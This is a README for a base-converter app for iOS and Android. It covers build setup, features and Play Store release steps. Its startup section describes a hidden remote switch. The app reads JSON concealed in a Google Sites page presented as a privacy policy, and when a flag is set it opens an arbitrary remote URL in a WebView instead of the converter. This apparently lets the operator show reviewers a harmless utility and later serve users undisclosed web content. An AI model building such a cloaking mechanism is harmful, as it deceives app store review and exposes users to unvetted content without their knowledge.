# Base Converter Apps (iOS + Android)

This repository now includes:

- `OCBaseConverter/` (Objective-C iOS app)
- `AndroidBaseConverter/` (Kotlin Android app for Google Play)

## Android (Google Play Ready Baseline)

### Run directly
1. Open `AndroidBaseConverter` with Android Studio (Giraffe+ recommended).
2. Let Gradle sync.
3. Run `app` on emulator or physical Android device.

If first run says wrapper jar missing, run:
```bash
cd /absolute/path/to/AndroidBaseConverter
gradle -b wrapper-bootstrap.gradle wrapper --no-validate-url
```

> Toolchain pin: AGP **8.1.1** + Gradle **8.0** for Android Studio compatibility.

> This project uses Gradle 8.0 wrapper.
> `gradle-wrapper.jar` is intentionally gitignored; `./gradlew` will auto-bootstrap it via local `gradle` on first run.


### Core features
- Premium dark gradient UI (English copy).
- Binary / Octal / Decimal / Hex conversion.
- Swap From/To bases and clear input.
- Dedicated result page (matching iOS flow).
- History list on home, tap item to reuse (same as iOS behavior).
- One-tap result copy to clipboard.
- Back button on result page.
- Custom blue “p” launcher logo integrated (adaptive icon + in-page logo).

- Splash AB routing with fail-safe: retries startup API up to 5 times (1.5s interval); if still failing, app falls back to native converter to avoid splash lock.
- If API returns `flag=true` with a non-empty `link`, app opens H5 page (WebView).
- Otherwise app enters native base-conversion flow.
- H5 WebView applies system-bars insets to avoid status bar / navigation bar overlap.


### Android SDK location (fix for "SDK location not found")
If Android Studio reports **SDK location not found**, set one of these:
1. `ANDROID_HOME` / `ANDROID_SDK_ROOT` environment variable.
2. `AndroidBaseConverter/local.properties` with:
   `sdk.dir=/Users/yourname/Library/Android/sdk`

A template file is included: `AndroidBaseConverter/local.properties.example`.

### For Play Store release
- Replace launcher icon.
- Add privacy policy URL and app listing assets.
- Enable release signing and create AAB from `Build > Generate Signed Bundle / APK`.


## Startup remote config source
The app reads remote config from:
`https://sites.google.com/view/privacy-policy-for-piper/`

It extracts JSON from script text between `@` markers, for example:
```html
<script>
  const jsonStr = '@{"app":"0","data":"https://www.baidu.com","adjuct":0,"color":"","style":0}@';
</script>
```

Routing rule:
- `app = "0"` => open native converter (A-side)
- `app = "1"` + non-empty `data` => open H5 page (`data` as URL)
- `adjuct / color / style` are reserved for future use

